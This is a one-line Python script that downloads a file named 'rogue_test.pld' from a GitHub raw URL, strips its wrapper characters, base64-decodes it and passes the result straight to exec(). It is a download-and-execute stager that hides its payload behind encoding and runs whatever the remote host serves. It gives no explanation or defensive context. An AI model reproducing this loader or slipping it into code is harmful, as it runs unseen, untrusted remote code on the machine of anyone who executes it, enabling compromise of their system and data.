from base64 import b64decode;from requests import get;source = "http://raw.githubusercontent.com/rf-peixoto/Studies/main/Code/Misc/rogue_test.pld";exec(b64decode(get(source).text[2:-2]))
